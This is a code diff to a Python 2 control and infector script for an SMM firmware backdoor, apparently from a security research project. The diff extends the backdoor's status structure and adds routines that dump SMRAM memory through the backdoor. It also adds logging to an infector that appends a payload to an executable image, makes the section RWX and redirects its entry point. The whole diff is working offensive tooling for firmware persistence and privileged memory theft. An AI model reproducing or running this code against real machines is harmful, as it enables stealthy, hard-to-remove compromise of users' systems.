@@ -28,8 +28,11 @@ INFECTOR_SIGN = 'INFECTED'
 
 # EFI variable with struct _BACKDOOR_INFO physical address
 BACKDOOR_INFO_EFI_VAR = 'SmmBackdoorInfo-3a452e85-a7ca-438f-a5cb-ad3a70c5d01b'
-BACKDOOR_INFO_FMT = 'QQQ'
-BACKDOOR_INFO_LEN = 8 * 3
+BACKDOOR_INFO_FMT = 'QQQQQ'
+BACKDOOR_INFO_LEN = 8 * 5
+
+# idicate that SMRAM regions were copied to BACKDOOR_INFO structure
+BACKDOOR_INFO_FULL = 0xFFFFFFFF
 
 PAGE_SIZE = 0x1000
 
@@ -126,7 +129,7 @@ def dump_mem_page(addr, count = None):
         page_addr = addr + PAGE_SIZE * i
         send_sw_smi(BACKDOOR_SW_SMI_VAL, BACKDOOR_SW_DATA_READ_PHYS_MEM, page_addr)
 
-        _, _, last_status = get_backdoor_info(addr = backdoor_info)
+        _, _, last_status, _, _ = get_backdoor_info(addr = backdoor_info)
         if last_status != 0:
 
             raise Exception('SMM backdoor error 0x%.8x' % last_status)
@@ -136,22 +139,67 @@ def dump_mem_page(addr, count = None):
 
     return ret
 
-def dump_smram():
+def dump_smram():        
+
+    # get backdoor status
+    info_addr = get_backdoor_info_addr()
+    _, _, last_status, _, _ = get_backdoor_info(addr = info_addr)
+
+    # get SMRAM information
+    regions, contents = get_smram_info(), []
+    regions_merged = []
+
+    if len(regions) > 1:
+
+        # join neighbour regions
+        for i in range(0, len(regions) - 1):
+
+            curr_addr, curr_size, curr_opt = regions[i]
+            next_addr, next_size, next_opt = regions[i + 1]
+
+            if curr_addr + curr_size == next_addr:
+
+                # join two regions
+                regions[i + 1] = ( curr_addr, curr_size + next_size, curr_opt )
+
+            else:
+
+                # copy region information
+                regions_merged.append(( curr_addr, curr_size, curr_opt ))
+
+        region_addr, region_size, region_opt = regions[-1]
+        regions_merged.append(( region_addr, region_size, region_opt ))
+
+    elif len(regions) > 0:
+
+        regions_merged = regions
+
+    else:
+
+        raise(Exception('No SMRAM regions found'))
+
+    print '[+] Dumping SMRAM regions, this may take a while...'
 
     try:
 
-        contents = []
-
-        print '[+] Dumping SMRAM regions, this may take a while...'
+        ptr = PAGE_SIZE
 
         # enumerate and dump available SMRAM regions
-        for region in get_smram_info():        
+        for region in regions_merged: 
             
-            region_addr, region_size, _ = region
-
-            # dump region contents
+            region_addr, region_size, _ = region            
             name = 'SMRAM_dump_%.8x_%.8x.bin' % (region_addr, region_addr + region_size - 1)
-            data = dump_mem_page(region_addr, region_size / PAGE_SIZE)
+
+            if last_status == BACKDOOR_INFO_FULL:
+
+                # dump region contents from BACKDOOR_INFO structure
+                data = mem_read(info_addr + ptr, region_size)
+                ptr += region_size
+
+            else:
+
+                # dump region contents with sending SW SMI to SMM backdoor
+                data = dump_mem_page(region_addr, region_size / PAGE_SIZE)
 
             contents.append(( name, data ))
 
@@ -177,10 +225,14 @@ def check_system():
         backdoor_info = get_backdoor_info_addr()
         print '[+] struct _BACKDOOR_INFO physical address is', hex(backdoor_info) 
 
-        calls_count, ticks_count, last_status = get_backdoor_info(addr = backdoor_info)
+        calls_count, ticks_count, last_status, smm_mca_cap, smm_feature_control = \
+            get_backdoor_info(addr = backdoor_info)
+
         print '[+] BackdoorEntry() calls count is %d' % calls_count
         print '[+] PeriodicTimerDispatch2Handler() calls count is %d' % ticks_count
         print '[+] Last status code is 0x%.8x' % last_status
+        print '[+] MSR_SMM_MCA_CAP register value is 0x%x' % smm_mca_cap
+        print '[+] MSR_SMM_FEATURE_CONTROL register value is 0x%x' % smm_feature_control
 
         print '[+] SMRAM map:'
 
@@ -246,7 +298,7 @@ def infect(src, payload, dst = None):
     data = open(payload, 'rb').read()
 
     # read _INFECTOR_CONFIG, this structure is located at .conf section of payload image
-    conf_ep_new, conf_ep_old = _infector_config_get(pe_payload, data)    
+    conf_ep_new, conf_ep_old = _infector_config_get(pe_payload, data) 
 
     last_section = None
     for section in pe_src.sections:
@@ -261,12 +313,18 @@ def infect(src, payload, dst = None):
     # save original entry point address of target image
     conf_ep_old = pe_src.OPTIONAL_HEADER.AddressOfEntryPoint
 
+    print 'Original entry point RVA is 0x%.8x' % conf_ep_old 
+    print 'Original %s virtual size is 0x%.8x' % \
+          (last_section.Name.split('\0')[0], last_section.Misc_VirtualSize)
+
+    print 'Original image size is 0x%.8x' % pe_src.OPTIONAL_HEADER.SizeOfImage
+
     # write updated _INFECTOR_CONFIG back to the payload image
     data = _infector_config_set(pe_payload, data, conf_ep_new, conf_ep_old)
 
     # set new entry point of target image
     pe_src.OPTIONAL_HEADER.AddressOfEntryPoint = \
-        last_section.VirtualAddress + last_section.SizeOfRawData + conf_ep_new
+        last_section.VirtualAddress + last_section.SizeOfRawData + conf_ep_new    
 
     # update last section size
     last_section.SizeOfRawData += len(data)
@@ -275,11 +333,19 @@ def infect(src, payload, dst = None):
     # make it executable
     last_section.Characteristics = pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_READ'] | \
                                    pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_WRITE'] | \
-                                   pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_EXECUTE']
+                                   pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_EXECUTE']  
+
+    print 'Characteristics of %s section was changed to RWX' % last_section.Name.split('\0')[0] 
 
     # update image headers
     pe_src.OPTIONAL_HEADER.SizeOfImage = last_section.VirtualAddress + last_section.Misc_VirtualSize
-    pe_src.DOS_HEADER.e_res = INFECTOR_SIGN
+    pe_src.DOS_HEADER.e_res = INFECTOR_SIGN    
+
+    print 'New entry point RVA is 0x%.8x' % pe_src.OPTIONAL_HEADER.AddressOfEntryPoint
+    print 'New %s virtual size is 0x%.8x' % \
+          (last_section.Name.split('\0')[0], last_section.Misc_VirtualSize)
+
+    print 'New image size is 0x%.8x' % pe_src.OPTIONAL_HEADER.SizeOfImage
 
     # get infected image data
     data = pe_src.write() + data
@@ -382,8 +448,8 @@ def main():
             print '[!] --payload must be specified'
             return -1
 
-        print '[+] Target image:', options.infect        
-        print '[+] Payload:', options.payload
+        print '[+] Target image to infect:', options.infect        
+        print '[+] Infector payload:', options.payload
 
         if options.output is None:
 
@@ -399,6 +465,8 @@ def main():
 
         # infect source file with specified payload
         infect(options.infect, options.payload, dst = options.output) 
+
+        print '[+] DONE'
 
         return 0
 
